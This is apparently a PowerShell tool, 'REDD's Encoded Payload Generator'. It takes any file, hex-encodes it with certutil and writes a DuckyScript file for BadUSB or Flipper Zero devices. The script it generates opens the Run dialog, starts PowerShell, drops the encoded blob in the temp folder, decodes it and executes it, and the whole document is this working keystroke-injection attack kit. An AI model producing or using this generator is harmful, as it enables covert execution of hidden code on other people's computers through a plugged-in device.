# Title: REDD's Encoded Payload Generator
# Description: Creates a encrypted Payload for BadUSB/Duckyscript Devices.
# AUTHOR: InfoSecREDD
# Version: 1.2
$path = split-path -parent $MyInvocation.MyCommand.Definition
$payload_filename = "payload.txt"
$payload_file = "$path\$payload_filename"
$temp_file = "$path\temp.txt"
$argcheck = $args.Count
$flipper = 0
Write-Host "`n`n   :::::::::  :::::::::: :::::::::  :::::::::  ::: ::::::::  `n   :+:    :+: :+:        :+:    :+: :+:    :+: :+ :+:    :+: `n   +:+    +:+ +:+        +:+    +:+ +:+    +:+    +:+        `n   +#++:++#:  +#++:++#   +#+    +:+ +#+    +:+    +#++:++#++ `n   +#+    +#+ +#+        +#+    +#+ +#+    +#+           +#+ `n   #+#    #+# #+#        #+#    #+# #+#    #+#    #+#    #+# `n   ###    ### ########## #########  #########      ######## `n`n              REDD's Encrypted Payload Generator`n"
if ( 0 -eq $argcheck )
{
  Write-Host "`nERROR: No arguments supplied to encode.`n`nSyntax: encode.ps1 `<File_to_Encode`>`n`n"
  exit
}
if ( 1 -eq $argcheck )
{
  certutil -encodehex -f $args $temp_file 0x40000001 >$null 2>&1
}
elseif ( 2 -ge $argcheck ) 
{
  if ( $args[1] -eq "-flipper" )
  {
     Write-Host "Creating $payload_filename for Flipper Zero BadUSB Compatiblity."
     $flipper = 1
     certutil -encodehex -f $args[0] $temp_file 0x40000001 >$null 2>&1
  } 
  else {
	 $showargs = $args[1]
     Write-Host "ERROR: Arugment `'$showargs`' is not valid. Please try again.`n"
     exit
  }
}
else
{
  Write-Host "Arguments are not valid. Please Try again.`n"
}
$output = Get-Content $temp_file | Out-String
$output = $output.replace("`r`n", "")
Remove-Item $temp_file >$null 2>&1
if (Test-Path $payload_file) {
  Remove-Item $payload_file >$null 2>&1
  New-Item -Name $payload_filename -ItemType File >$null 2>&1
}
else {
  New-Item -Name $payload_filename -ItemType File >$null 2>&1
}
"REM Generated by REDD's Encoded Payload Generator" | Out-File -FilePath $payload_file -Append
if ( 1 -ne $flipper )
{
  "DUCKY_LANG US" | Out-File -FilePath $payload_file -Append
}
else
{
  Write-Host "--> Skipping DUCKY_LANG String for Flipper Compatibility."
}
"DELAY 2000" | Out-File -FilePath $payload_file -Append
"GUI r" | Out-File -FilePath $payload_file -Append
"DELAY 200" | Out-File -FilePath $payload_file -Append
"STRING powershell" | Out-File -FilePath $payload_file -Append
"DELAY 200" | Out-File -FilePath $payload_file -Append
"STRING `$TempFile = `"`$env:TEMP\temp.ps1`"; `$File = `"`$env:TEMP\l.ps1`"; echo $output`> `$TempFile`; certutil -f -decode `$TempFile $File `| out-null`; `& `"`$env:TEMP\l.ps1`"" | Out-File -FilePath $payload_file -Append
"DELAY 1000" | Out-File -FilePath $payload_file -Append
"ENTER" | Out-File -FilePath $payload_file -Append
Write-Host "`nPayload Generation Complete.`n`n  Location: $payload_file`n`n"